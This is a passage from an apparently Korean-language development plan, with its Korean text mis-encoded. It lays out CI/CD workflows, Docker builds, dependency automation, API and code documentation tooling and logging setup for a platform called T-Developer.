        uses: actions/setup-node@v4
        with:
          node-version: ${{ env.NODE_VERSION }}
          cache: 'npm'
          
      - name: Install dependencies
        run: |
          cd backend
          npm ci
          
      - name: Build TypeScript
        run: |
          cd backend
          npm run build
          
      - name: Upload build artifacts
        uses: actions/upload-artifact@v3
        with:
          name: build-artifacts
          path: backend/dist/
          retention-days: 7
```

### SubTask 0.7.2: ìë™ ë²„ì „ ê´€ë¦¬ ì„¤ì •
**ëª©í‘œ**: Semantic Versioning ìë™í™”

**êµ¬í˜„ ë‚´ìš©**:
```json
// .releaserc.json
{
  "branches": ["main"],
  "plugins": [
    "@semantic-release/commit-analyzer",
    "@semantic-release/release-notes-generator",
    "@semantic-release/changelog",
    "@semantic-release/npm",
    "@semantic-release/github",
    [
      "@semantic-release/git",
      {
        "assets": ["package.json", "package-lock.json", "CHANGELOG.md"],
        "message": "chore(release): ${nextRelease.version} [skip ci]\n\n${nextRelease.notes}"
      }
    ]
  ]
}
```

```yaml
# .github/workflows/release.yml
name: Release

on:
  push:
    branches: [ main ]

jobs:
  release:
    name: Release
    runs-on: ubuntu-latest
    
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
          token: ${{ secrets.GITHUB_TOKEN }}
          
      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '18.x'
          
      - name: Install dependencies
        run: npm ci
        
      - name: Run semantic-release
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
        run: npx semantic-release
```

### SubTask 0.7.3: Docker ì´ë¯¸ì§€ ë¹Œë“œ íŒŒì´í”„ë¼ì¸
**ëª©í‘œ**: ìë™í™”ëœ Docker ì´ë¯¸ì§€ ë¹Œë“œ ë° í‘¸ì‹œ

**êµ¬í˜„ ë‚´ìš©**:
```yaml
# .github/workflows/docker.yml
name: Docker Build and Push

on:
  push:
    branches: [ main, develop ]
    tags: [ 'v*' ]

env:
  REGISTRY: ghcr.io
  IMAGE_NAME: ${{ github.repository }}

jobs:
  build-and-push:
    name: Build and Push Docker Image
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write
      
    steps:
      - uses: actions/checkout@v4
      
      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3
        
      - name: Log in to GitHub Container Registry
        uses: docker/login-action@v3
        with:
          registry: ${{ env.REGISTRY }}
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
          
      - name: Extract metadata
        id: meta
        uses: docker/metadata-action@v5
        with:
          images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}
          tags: |
            type=ref,event=branch
            type=ref,event=pr
            type=semver,pattern={{version}}
            type=semver,pattern={{major}}.{{minor}}
            type=sha
            
      - name: Build and push Docker image
        uses: docker/build-push-action@v5
        with:
          context: ./backend
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}
          cache-from: type=gha
          cache-to: type=gha,mode=max
          build-args: |
            NODE_ENV=production
            BUILD_DATE=${{ github.event.head_commit.timestamp }}
            VCS_REF=${{ github.sha }}
```

```dockerfile
# backend/Dockerfile
# Build stage
FROM node:18-alpine AS builder

WORKDIR /app

# Copy package files
COPY package*.json ./
RUN npm ci --only=production

# Copy source code
COPY . .

# Build application
RUN npm run build

# Runtime stage
FROM node:18-alpine

# Install dumb-init for proper signal handling
RUN apk add --no-cache dumb-init

# Create non-root user
RUN addgroup -g 1001 -S nodejs
RUN adduser -S nodejs -u 1001

WORKDIR /app

# Copy node_modules and built application
COPY --from=builder --chown=nodejs:nodejs /app/node_modules ./node_modules
COPY --from=builder --chown=nodejs:nodejs /app/dist ./dist
COPY --from=builder --chown=nodejs:nodejs /app/package.json ./

# Switch to non-root user
USER nodejs

# Expose port
EXPOSE 8000

# Health check
HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \
  CMD node healthcheck.js || exit 1

# Start application with dumb-init
ENTRYPOINT ["dumb-init", "--"]
CMD ["node", "dist/main.js"]
```
---

### SubTask 0.7.4: í…ŒìŠ¤íŠ¸ ìë™í™” íŒŒì´í”„ë¼ì¸ ì„¤ì •
**ëª©í‘œ**: PR ë° ë¨¸ì§€ ì‹œ ìë™ í…ŒìŠ¤íŠ¸ ì‹¤í–‰ ì„¤ì •

**êµ¬í˜„ ë‚´ìš©**:
```yaml
# .github/workflows/test-automation.yml
name: Automated Testing Pipeline

on:
  pull_request:
    types: [opened, synchronize, reopened]
  push:
    branches: [main, develop]

jobs:
  test-matrix:
    name: Test Suite - ${{ matrix.test-suite }}
    runs-on: ubuntu-latest
    
    strategy:
      matrix:
        test-suite: [unit, integration, e2e]
        node-version: [18.x, 20.x]
        include:
          - test-suite: unit
            timeout: 10
          - test-suite: integration
            timeout: 20
          - test-suite: e2e
            timeout: 30
    
    services:
      dynamodb:
        image: amazon/dynamodb-local
        ports:
          - 8000:8000
        options: >-
          --health-cmd "curl http://localhost:8000"
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
      
      redis:
        image: redis:7-alpine
        ports:
          - 6379:6379
        options: >-
          --health-cmd "redis-cli ping"
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
    
    steps:
      - uses: actions/checkout@v4
      
      - name: Setup Node.js ${{ matrix.node-version }}
        uses: actions/setup-node@v4
        with:
          node-version: ${{ matrix.node-version }}
          cache: 'npm'
      
      - name: Cache dependencies
        uses: actions/cache@v3
        with:
          path: |
            node_modules
            ~/.npm
          key: ${{ runner.os }}-node-${{ hashFiles('**/package-lock.json') }}
          restore-keys: |
            ${{ runner.os }}-node-
      
      - name: Install dependencies
        run: |
          cd backend
          npm ci
      
      - name: Setup test environment
        run: |
          cd backend
          npm run test:setup:${{ matrix.test-suite }}
        env:
          DYNAMODB_ENDPOINT: http://localhost:8000
          REDIS_HOST: localhost
      
      - name: Run ${{ matrix.test-suite }} tests
        run: |
          cd backend
          npm run test:${{ matrix.test-suite }} -- --coverage
        timeout-minutes: ${{ matrix.timeout }}
        env:
          NODE_ENV: test
          CI: true
      
      - name: Upload coverage reports
        if: matrix.node-version == '18.x'
        uses: actions/upload-artifact@v3
        with:
          name: coverage-${{ matrix.test-suite }}
          path: backend/coverage/
      
      - name: Comment test results on PR
        if: github.event_name == 'pull_request' && matrix.node-version == '18.x'
        uses: actions/github-script@v7
        with:
          script: |
            const testResults = require('./backend/test-results.json');
            const comment = `## Test Results - ${{ matrix.test-suite }}
            
            âœ… Passed: ${testResults.numPassedTests}
            âŒ Failed: ${testResults.numFailedTests}
            â­ï¸ Skipped: ${testResults.numPendingTests}
            â±ï¸ Duration: ${(testResults.duration / 1000).toFixed(2)}s
            
            Coverage: ${testResults.coverage}%`;
            
            github.rest.issues.createComment({
              issue_number: context.issue.number,
              owner: context.repo.owner,
              repo: context.repo.repo,
              body: comment
            });
```

### SubTask 0.7.5: ì˜ì¡´ì„± ì—…ë°ì´íŠ¸ ìë™í™”
**ëª©í‘œ**: ë³´ì•ˆ ì·¨ì•½ì  ë° ì˜ì¡´ì„± ì—…ë°ì´íŠ¸ ìë™í™”

**êµ¬í˜„ ë‚´ìš©**:
```yaml
# .github/workflows/dependency-update.yml
name: Dependency Update Automation

on:
  schedule:
    - cron: '0 9 * * 1' # ë§¤ì£¼ ì›”ìš”ì¼ ì˜¤ì „ 9ì‹œ
  workflow_dispatch:

jobs:
  update-dependencies:
    name: Update Dependencies
    runs-on: ubuntu-latest
    
    steps:
      - uses: actions/checkout@v4
        with:
          token: ${{ secrets.GITHUB_TOKEN }}
      
      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '18.x'
      
      - name: Update npm dependencies
        run: |
          cd backend
          npx npm-check-updates -u --target minor
          npm install
          npm audit fix
      
      - name: Run tests after update
        run: |
          cd backend
          npm test
        continue-on-error: true
      
      - name: Create Pull Request
        uses: peter-evans/create-pull-request@v5
        with:
          token: ${{ secrets.GITHUB_TOKEN }}
          commit-message: 'chore: update dependencies'
          title: 'ğŸ”„ Weekly Dependency Update'
          body: |
            ## Automated Dependency Update
            
            This PR contains the following updates:
            - Minor version updates for all dependencies
            - Security patches applied via `npm audit fix`
            
            ### Checklist
            - [ ] All tests pass
            - [ ] No breaking changes identified
            - [ ] Security vulnerabilities resolved
          branch: deps/weekly-update
          delete-branch: true
```

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/backend"
    schedule:
      interval: "daily"
    open-pull-requests-limit: 5
    groups:
      aws-sdk:
        patterns:
          - "@aws-sdk/*"
      development:
        patterns:
          - "@types/*"
          - "eslint*"
          - "prettier*"
          - "jest*"
    
  - package-ecosystem: "docker"
    directory: "/"
    schedule:
      interval: "weekly"
    
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
```

**ğŸ”§ ì‚¬ìš©ì ì‘ì—…**:
- GitHub ì €ì¥ì†Œ Settingsì—ì„œ Dependabot í™œì„±í™”
- Dependabot ë³´ì•ˆ ì•Œë¦¼ ì„¤ì •
- ìë™ ë¨¸ì§€ ê·œì¹™ ì„¤ì • (ì„ íƒì‚¬í•­)

---

## Task 0.8: ë¬¸ì„œí™” ì‹œìŠ¤í…œ êµ¬ì¶•

### SubTask 0.8.1: API ë¬¸ì„œ ìë™ ìƒì„± ì„¤ì •
**ëª©í‘œ**: OpenAPI/Swagger ê¸°ë°˜ API ë¬¸ì„œ ìë™í™”

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// backend/src/config/swagger.ts
import swaggerJsdoc from 'swagger-jsdoc';
import swaggerUi from 'swagger-ui-express';
import { Express } from 'express';

const swaggerOptions: swaggerJsdoc.Options = {
  definition: {
    openapi: '3.0.0',
    info: {
      title: 'T-Developer API',
      version: '1.0.0',
      description: 'AI-powered multi-agent development platform API',
      contact: {
        name: 'T-Developer Team',
        email: 'support@t-developer.com'
      },
      license: {
        name: 'MIT',
        url: 'https://opensource.org/licenses/MIT'
      }
    },
    servers: [
      {
        url: 'http://localhost:8000/api/v1',
        description: 'Development server'
      },
      {
        url: 'https://api.t-developer.com/v1',
        description: 'Production server'
      }
    ],
    components: {
      securitySchemes: {
        bearerAuth: {
          type: 'http',
          scheme: 'bearer',
          bearerFormat: 'JWT'
        },
        apiKey: {
          type: 'apiKey',
          in: 'header',
          name: 'X-API-Key'
        }
      }
    }
  },
  apis: [
    './src/routes/*.ts',
    './src/models/*.ts',
    './src/controllers/*.ts'
  ]
};

export function setupSwagger(app: Express): void {
  const swaggerSpec = swaggerJsdoc(swaggerOptions);
  
  // Swagger UI
  app.use('/api-docs', swaggerUi.serve, swaggerUi.setup(swaggerSpec, {
    explorer: true,
    customCss: '.swagger-ui .topbar { display: none }',
    customSiteTitle: 'T-Developer API Documentation'
  }));
  
  // JSON spec endpoint
  app.get('/api-docs.json', (req, res) => {
    res.setHeader('Content-Type', 'application/json');
    res.send(swaggerSpec);
  });
}

// API ì—”ë“œí¬ì¸íŠ¸ ë¬¸ì„œí™” ì˜ˆì‹œ
/**
 * @swagger
 * /projects:
 *   post:
 *     summary: Create a new project
 *     tags: [Projects]
 *     security:
 *       - bearerAuth: []
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             required:
 *               - name
 *               - description
 *             properties:
 *               name:
 *                 type: string
 *                 description: Project name
 *               description:
 *                 type: string
 *                 description: Natural language project description
 *               projectType:
 *                 type: string
 *                 enum: [web, api, mobile, desktop, cli]
 *               targetPlatforms:
 *                 type: array
 *                 items:
 *                   type: string
 *     responses:
 *       201:
 *         description: Project created successfully
 *         content:
 *           application/json:
 *             schema:
 *               $ref: '#/components/schemas/Project'
 *       400:
 *         description: Invalid request
 *       401:
 *         description: Unauthorized
 */
```

### SubTask 0.8.2: ì½”ë“œ ë¬¸ì„œí™” í‘œì¤€ ì„¤ì •
**ëª©í‘œ**: JSDoc/TSDoc í‘œì¤€ ë° ìë™ ìƒì„± ì„¤ì •

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// backend/typedoc.json
{
  "entryPoints": ["./src"],
  "entryPointStrategy": "expand",
  "out": "./docs/api",
  "exclude": [
    "**/*.test.ts",
    "**/*.spec.ts",
    "**/node_modules/**"
  ],
  "theme": "default",
  "name": "T-Developer API Reference",
  "includeVersion": true,
  "excludePrivate": true,
  "excludeProtected": false,
  "excludeInternal": true,
  "readme": "./README.md",
  "plugin": ["typedoc-plugin-markdown"],
  "githubPages": false,
  "validation": {
    "notExported": true,
    "invalidLink": true,
    "notDocumented": false
  }
}
```

```typescript
// backend/src/standards/documentation.ts
/**
 * T-Developer ë¬¸ì„œí™” í‘œì¤€ ì˜ˆì‹œ
 * 
 * @module DocumentationStandards
 */

/**
 * í”„ë¡œì íŠ¸ ìƒì„± ì„œë¹„ìŠ¤
 * 
 * @class ProjectService
 * @description ìì—°ì–´ ì„¤ëª…ì„ ê¸°ë°˜ìœ¼ë¡œ í”„ë¡œì íŠ¸ë¥¼ ìƒì„±í•˜ê³  ê´€ë¦¬í•˜ëŠ” ì„œë¹„ìŠ¤
 * 
 * @example
 * ```typescript
 * const projectService = new ProjectService();
 * const project = await projectService.createProject({
 *   name: "My E-commerce Platform",
 *   description: "Create a modern e-commerce platform with React and Node.js"
 * });
 * ```
 */
export class ProjectService {
  /**
   * ìƒˆë¡œìš´ í”„ë¡œì íŠ¸ ìƒì„±
   * 
   * @param {CreateProjectDto} dto - í”„ë¡œì íŠ¸ ìƒì„± ì •ë³´
   * @param {string} dto.name - í”„ë¡œì íŠ¸ ì´ë¦„
   * @param {string} dto.description - ìì—°ì–´ í”„ë¡œì íŠ¸ ì„¤ëª…
   * @param {string} [dto.projectType] - í”„ë¡œì íŠ¸ íƒ€ì… (web, api, mobile ë“±)
   * @param {string[]} [dto.targetPlatforms] - ëŒ€ìƒ í”Œë«í¼ ëª©ë¡
   * 
   * @returns {Promise<Project>} ìƒì„±ëœ í”„ë¡œì íŠ¸ ì •ë³´
   * 
   * @throws {ValidationError} ì…ë ¥ ë°ì´í„°ê°€ ìœ íš¨í•˜ì§€ ì•Šì€ ê²½ìš°
   * @throws {QuotaExceededError} í”„ë¡œì íŠ¸ ìƒì„± í•œë„ ì´ˆê³¼
   * 
   * @since 1.0.0
   * @author T-Developer Team
   */
  async createProject(dto: CreateProjectDto): Promise<Project> {
    // êµ¬í˜„...
  }
  
  /**
   * í”„ë¡œì íŠ¸ ìƒíƒœ ì—…ë°ì´íŠ¸
   * 
   * @param {string} projectId - í”„ë¡œì íŠ¸ ID
   * @param {ProjectStatus} status - ìƒˆë¡œìš´ ìƒíƒœ
   * @param {Object} [metadata] - ì¶”ê°€ ë©”íƒ€ë°ì´í„°
   * 
   * @returns {Promise<void>}
   * 
   * @fires ProjectStatusChanged - ìƒíƒœ ë³€ê²½ ì‹œ ì´ë²¤íŠ¸ ë°œìƒ
   * 
   * @internal
   */
  private async updateProjectStatus(
    projectId: string, 
    status: ProjectStatus,
    metadata?: Record<string, any>
  ): Promise<void> {
    // êµ¬í˜„...
  }
}
```

### SubTask 0.8.3: README í…œí”Œë¦¿ ìƒì„±
**ëª©í‘œ**: í”„ë¡œì íŠ¸ ë° ì»´í¬ë„ŒíŠ¸ë³„ README í…œí”Œë¦¿

**êµ¬í˜„ ë‚´ìš©**:
```markdown
<!-- templates/README-project.md -->
# {{PROJECT_NAME}}

![T-Developer](https://img.shields.io/badge/Generated%20by-T--Developer-blue)
![Version](https://img.shields.io/badge/version-{{VERSION}}-green)
![License](https://img.shields.io/badge/license-{{LICENSE}}-yellow)

## ğŸ“‹ í”„ë¡œì íŠ¸ ê°œìš”

{{PROJECT_DESCRIPTION}}

### ğŸ¯ ì£¼ìš” ê¸°ëŠ¥
{{#FEATURES}}
- {{.}}
{{/FEATURES}}

## ğŸš€ ë¹ ë¥¸ ì‹œì‘

### í•„ìˆ˜ ìš”êµ¬ì‚¬í•­
- Node.js {{NODE_VERSION}}+
- {{#REQUIREMENTS}}{{.}}, {{/REQUIREMENTS}}

### ì„¤ì¹˜
```bash
# ì €ì¥ì†Œ í´ë¡ 
git clone {{REPOSITORY_URL}}
cd {{PROJECT_NAME}}

# ì˜ì¡´ì„± ì„¤ì¹˜
npm install

# í™˜ê²½ ë³€ìˆ˜ ì„¤ì •
cp .env.example .env
# .env íŒŒì¼ì„ í¸ì§‘í•˜ì—¬ í•„ìš”í•œ ê°’ ì„¤ì •
```

### ì‹¤í–‰
```bash
# ê°œë°œ ëª¨ë“œ
npm run dev

# í”„ë¡œë•ì…˜ ë¹Œë“œ
npm run build

# í”„ë¡œë•ì…˜ ì‹¤í–‰
npm start
```

## ğŸ—ï¸ í”„ë¡œì íŠ¸ êµ¬ì¡°

```
{{PROJECT_NAME}}/
â”œâ”€â”€ src/
â”‚   â”œâ”€â”€ controllers/    # API ì»¨íŠ¸ë¡¤ëŸ¬
â”‚   â”œâ”€â”€ services/       # ë¹„ì¦ˆë‹ˆìŠ¤ ë¡œì§
â”‚   â”œâ”€â”€ models/         # ë°ì´í„° ëª¨ë¸
â”‚   â”œâ”€â”€ routes/         # API ë¼ìš°íŠ¸
â”‚   â””â”€â”€ utils/          # ìœ í‹¸ë¦¬í‹° í•¨ìˆ˜
â”œâ”€â”€ tests/              # í…ŒìŠ¤íŠ¸ íŒŒì¼
â”œâ”€â”€ docs/               # ë¬¸ì„œ
â””â”€â”€ scripts/            # ìŠ¤í¬ë¦½íŠ¸
```

## ğŸ“š API ë¬¸ì„œ

API ë¬¸ì„œëŠ” ë‹¤ìŒ ì£¼ì†Œì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
- ê°œë°œ: http://localhost:{{PORT}}/api-docs
- í”„ë¡œë•ì…˜: {{PRODUCTION_URL}}/api-docs

## ğŸ§ª í…ŒìŠ¤íŠ¸

```bash
# ë‹¨ìœ„ í…ŒìŠ¤íŠ¸
npm run test:unit

# í†µí•© í…ŒìŠ¤íŠ¸
npm run test:integration

# ì „ì²´ í…ŒìŠ¤íŠ¸
npm test
```

## ğŸ”§ í™˜ê²½ ë³€ìˆ˜

| ë³€ìˆ˜ëª… | ì„¤ëª… | ê¸°ë³¸ê°’ |
|--------|------|--------|
{{#ENV_VARS}}
| {{NAME}} | {{DESCRIPTION}} | {{DEFAULT}} |
{{/ENV_VARS}}

## ğŸ¤ ê¸°ì—¬í•˜ê¸°

ê¸°ì—¬ë¥¼ í™˜ì˜í•©ë‹ˆë‹¤! [CONTRIBUTING.md](./CONTRIBUTING.md)ë¥¼ ì°¸ê³ í•´ì£¼ì„¸ìš”.

## ğŸ“„ ë¼ì´ì„ ìŠ¤

ì´ í”„ë¡œì íŠ¸ëŠ” {{LICENSE}} ë¼ì´ì„ ìŠ¤ í•˜ì— ë°°í¬ë©ë‹ˆë‹¤.

---

Generated with â¤ï¸ by [T-Developer](https://github.com/t-developer)
```

```typescript
// backend/src/utils/readme-generator.ts
import Handlebars from 'handlebars';
import fs from 'fs/promises';
import path from 'path';

export class ReadmeGenerator {
  private template: HandlebarsTemplateDelegate;
  
  constructor(templatePath: string) {
    this.loadTemplate(templatePath);
  }
  
  private async loadTemplate(templatePath: string): Promise<void> {
    const templateContent = await fs.readFile(templatePath, 'utf-8');
    this.template = Handlebars.compile(templateContent);
  }
  
  async generate(project: Project): Promise<string> {
    const context = {
      PROJECT_NAME: project.name,
      VERSION: '1.0.0',
      LICENSE: 'MIT',
      PROJECT_DESCRIPTION: project.description,
      FEATURES: this.extractFeatures(project),
      NODE_VERSION: '18',
      REQUIREMENTS: this.extractRequirements(project),
      REPOSITORY_URL: `https://github.com/${project.userId}/${project.name}`,
      PORT: 3000,
      PRODUCTION_URL: `https://api.${project.name}.com`,
      ENV_VARS: this.extractEnvVars(project)
    };
    
    return this.template(context);
  }
  
  private extractFeatures(project: Project): string[] {
    // í”„ë¡œì íŠ¸ì—ì„œ ì£¼ìš” ê¸°ëŠ¥ ì¶”ì¶œ
    return [
      'ì‚¬ìš©ì ì¸ì¦ ë° ê¶Œí•œ ê´€ë¦¬',
      'RESTful API',
      'ì‹¤ì‹œê°„ ë°ì´í„° ì—…ë°ì´íŠ¸',
      'í™•ì¥ ê°€ëŠ¥í•œ ì•„í‚¤í…ì²˜'
    ];
  }
  
  private extractRequirements(project: Project): string[] {
    const reqs = ['npm 8+'];
    
    if (project.techStack?.database) {
      reqs.push(project.techStack.database);
    }
    
    if (project.techStack?.cloud === 'aws') {
      reqs.push('AWS CLI');
    }
    
    return reqs;
  }
  
  private extractEnvVars(project: Project): any[] {
    return [
      { NAME: 'NODE_ENV', DESCRIPTION: 'ì‹¤í–‰ í™˜ê²½', DEFAULT: 'development' },
      { NAME: 'PORT', DESCRIPTION: 'ì„œë²„ í¬íŠ¸', DEFAULT: '3000' },
      { NAME: 'DATABASE_URL', DESCRIPTION: 'ë°ì´í„°ë² ì´ìŠ¤ ì—°ê²° URL', DEFAULT: 'N/A' }
    ];
  }
}
```

### SubTask 0.8.4: ê°œë°œì ê°€ì´ë“œ ë¬¸ì„œ êµ¬ì¡°
**ëª©í‘œ**: ê°œë°œìë¥¼ ìœ„í•œ ì¢…í•© ê°€ì´ë“œ ë¬¸ì„œ êµ¬ì¡° ìƒì„±

**êµ¬í˜„ ë‚´ìš©**:
```markdown
<!-- docs/developer-guide/index.md -->
# T-Developer ê°œë°œì ê°€ì´ë“œ

## ğŸ“š ëª©ì°¨

### 1. [ì‹œì‘í•˜ê¸°](./getting-started.md)
- ì‹œìŠ¤í…œ ìš”êµ¬ì‚¬í•­
- ì„¤ì¹˜ ë° ì„¤ì •
- ì²« í”„ë¡œì íŠ¸ ìƒì„±

### 2. [ì•„í‚¤í…ì²˜ ê°œìš”](./architecture.md)
- ì‹œìŠ¤í…œ ì•„í‚¤í…ì²˜
- ë©€í‹° ì—ì´ì „íŠ¸ ì‹œìŠ¤í…œ
- ê¸°ìˆ  ìŠ¤íƒ

### 3. [ì—ì´ì „íŠ¸ ê°œë°œ](./agents/)
- [ì—ì´ì „íŠ¸ í”„ë ˆì„ì›Œí¬](./agents/framework.md)
- [ì—ì´ì „íŠ¸ íƒ€ì…](./agents/types.md)
- [ì»¤ìŠ¤í…€ ì—ì´ì „íŠ¸ ê°œë°œ](./agents/custom.md)

### 4. [API ë ˆí¼ëŸ°ìŠ¤](./api/)
- [ì¸ì¦](./api/authentication.md)
- [í”„ë¡œì íŠ¸ ê´€ë¦¬](./api/projects.md)
- [ì—ì´ì „íŠ¸ ì œì–´](./api/agents.md)
- [ì›¹ì†Œì¼“ ì´ë²¤íŠ¸](./api/websocket.md)

### 5. [í†µí•© ê°€ì´ë“œ](./integrations/)
- [AWS ì„œë¹„ìŠ¤](./integrations/aws.md)
- [GitHub ì—°ë™](./integrations/github.md)
- [CI/CD íŒŒì´í”„ë¼ì¸](./integrations/cicd.md)

### 6. [ë² ìŠ¤íŠ¸ í”„ë™í‹°ìŠ¤](./best-practices/)
- [ë³´ì•ˆ](./best-practices/security.md)
- [ì„±ëŠ¥ ìµœì í™”](./best-practices/performance.md)
- [ì—ëŸ¬ ì²˜ë¦¬](./best-practices/error-handling.md)

### 7. [ë¬¸ì œ í•´ê²°](./troubleshooting/)
- [ì¼ë°˜ì ì¸ ë¬¸ì œ](./troubleshooting/common-issues.md)
- [ë””ë²„ê¹… ê°€ì´ë“œ](./troubleshooting/debugging.md)
- [FAQ](./troubleshooting/faq.md)
```

```typescript
// scripts/generate-docs.ts
import { exec } from 'child_process';
import { promisify } from 'util';
import path from 'path';

const execAsync = promisify(exec);

async function generateDocumentation() {
  console.log('ğŸ“š ë¬¸ì„œ ìƒì„± ì‹œì‘...');
  
  try {
    // TypeDocìœ¼ë¡œ API ë¬¸ì„œ ìƒì„±
    console.log('1ï¸âƒ£ API ë ˆí¼ëŸ°ìŠ¤ ìƒì„± ì¤‘...');
    await execAsync('npx typedoc');
    
    // Swagger ìŠ¤í™ ìƒì„±
    console.log('2ï¸âƒ£ OpenAPI ìŠ¤í™ ìƒì„± ì¤‘...');
    await execAsync('npm run generate:swagger');
    
    // Markdown ë¬¸ì„œ ì»´íŒŒì¼
    console.log('3ï¸âƒ£ ë§ˆí¬ë‹¤ìš´ ë¬¸ì„œ ì²˜ë¦¬ ì¤‘...');
    await execAsync('npx @diplodoc/cli --input ./docs --output ./dist/docs');
    
    // ë¬¸ì„œ ì¸ë±ìŠ¤ ìƒì„±
    console.log('4ï¸âƒ£ ë¬¸ì„œ ì¸ë±ìŠ¤ ìƒì„± ì¤‘...');
    await generateDocsIndex();
    
    console.log('âœ… ë¬¸ì„œ ìƒì„± ì™„ë£Œ!');
    console.log('ğŸ“ ì¶œë ¥ ìœ„ì¹˜: ./dist/docs');
    
  } catch (error) {
    console.error('âŒ ë¬¸ì„œ ìƒì„± ì‹¤íŒ¨:', error);
    process.exit(1);
  }
}

async function generateDocsIndex() {
  // ë¬¸ì„œ ì¸ë±ìŠ¤ ë° ê²€ìƒ‰ ê¸°ëŠ¥ì„ ìœ„í•œ ë©”íƒ€ë°ì´í„° ìƒì„±
  const docsMetadata = {
    version: process.env.npm_package_version,
    generated: new Date().toISOString(),
    sections: [
      { path: '/getting-started', title: 'ì‹œì‘í•˜ê¸°', weight: 1 },
      { path: '/architecture', title: 'ì•„í‚¤í…ì²˜', weight: 2 },
      { path: '/api', title: 'API ë ˆí¼ëŸ°ìŠ¤', weight: 3 }
    ]
  };
  
  await fs.writeFile(
    path.join('dist/docs/metadata.json'),
    JSON.stringify(docsMetadata, null, 2)
  );
}

if (require.main === module) {
  generateDocumentation();
}
```

### SubTask 0.8.5: ë³€ê²½ ë¡œê·¸ ìë™í™”
**ëª©í‘œ**: ì»¤ë°‹ ë©”ì‹œì§€ ê¸°ë°˜ CHANGELOG ìë™ ìƒì„±

**êµ¬í˜„ ë‚´ìš©**:
```json
// .commitlintrc.json
{
  "extends": ["@commitlint/config-conventional"],
  "rules": {
    "type-enum": [
      2,
      "always",
      [
        "feat",
        "fix",
        "docs",
        "style",
        "refactor",
        "perf",
        "test",
        "chore",
        "revert",
        "build",
        "ci"
      ]
    ],
    "subject-case": [2, "always", "sentence-case"],
    "header-max-length": [2, "always", 100]
  }
}
```

```javascript
// .changelog.config.js
module.exports = {
  "types": [
    { "type": "feat", "section": "âœ¨ Features", "hidden": false },
    { "type": "fix", "section": "ğŸ› Bug Fixes", "hidden": false },
    { "type": "perf", "section": "âš¡ Performance", "hidden": false },
    { "type": "docs", "section": "ğŸ“š Documentation", "hidden": false },
    { "type": "style", "section": "ğŸ’ Styles", "hidden": true },
    { "type": "refactor", "section": "â™»ï¸ Refactoring", "hidden": false },
    { "type": "test", "section": "âœ… Tests", "hidden": true },
    { "type": "chore", "section": "ğŸ”§ Chores", "hidden": true },
    { "type": "build", "section": "ğŸ“¦ Build", "hidden": true },
    { "type": "ci", "section": "ğŸ‘· CI", "hidden": true }
  ],
  "releaseCommitMessageFormat": "chore(release): ğŸš€ v{{currentTag}}",
  "commitUrlFormat": "{{host}}/{{owner}}/{{repository}}/commit/{{hash}}",
  "compareUrlFormat": "{{host}}/{{owner}}/{{repository}}/compare/{{previousTag}}...{{currentTag}}",
  "issueUrlFormat": "{{host}}/{{owner}}/{{repository}}/issues/{{id}}",
  "userUrlFormat": "{{host}}/{{user}}",
  "issuePrefixes": ["#", "GH-"]
};
```

```yaml
# .github/workflows/changelog.yml
name: Generate Changelog

on:
  push:
    tags:
      - 'v*'

jobs:
  changelog:
    runs-on: ubuntu-latest
    
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      
      - name: Generate Changelog
        uses: orhun/git-cliff-action@v2
        with:
          config: .cliff.toml
          args: --verbose
        env:
          OUTPUT: CHANGELOG.md
      
      - name: Commit Changelog
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "github-actions[bot]@users.noreply.github.com"
          git add CHANGELOG.md
          git commit -m "docs: update CHANGELOG.md for ${{ github.ref_name }}"
          git push
```

**ğŸ”§ ì‚¬ìš©ì ì‘ì—…**:
- commitlint ì„¤ì¹˜: `npm install --save-dev @commitlint/cli @commitlint/config-conventional`
- husky ì„¤ì •ìœ¼ë¡œ ì»¤ë°‹ ë©”ì‹œì§€ ê²€ì¦
- ì²« ë¦´ë¦¬ìŠ¤ íƒœê·¸ ìƒì„± ì‹œ CHANGELOG ìë™ ìƒì„± í™•ì¸

---

## Task 0.9: ëª¨ë‹ˆí„°ë§ ë° ë¡œê¹… ì‹œìŠ¤í…œ êµ¬ì¶•

### SubTask 0.9.1: êµ¬ì¡°í™”ëœ ë¡œê¹… ì‹œìŠ¤í…œ êµ¬í˜„
**ëª©í‘œ**: Winston ê¸°ë°˜ êµ¬ì¡°í™”ëœ ë¡œê¹… ì‹œìŠ¤í…œ

**êµ¬í˜„ ë‚´ìš©**:
```typescript
// backend/src/config/logger.ts
import winston from 'winston';
import { WinstonTransport as AxiomTransport } from '@axiomhq/winston';
import DailyRotateFile from 'winston-daily-rotate-file';

// ì»¤ìŠ¤í…€ ë¡œê·¸ ë ˆë²¨
const customLevels = {
  levels: {
    fatal: 0,
    error: 1,
    warn: 2,
    info: 3,
    debug: 4,
    trace: 5
  },
  colors: {
    fatal: 'red bold',
    error: 'red',
    warn: 'yellow',
    info: 'green',
    debug: 'blue',
    trace: 'gray'
  }
};

// ë¡œê·¸ í¬ë§·
const logFormat = winston.format.combine(
  winston.format.timestamp({ format: 'YYYY-MM-DD HH:mm:ss.SSS' }),
  winston.format.errors({ stack: true }),
  winston.format.metadata({ fillExcept: ['message', 'level', 'timestamp', 'label'] }),
  winston.format.json()
);

// ê°œë°œ í™˜ê²½ìš© í¬ë§·
const devFormat = winston.format.combine(
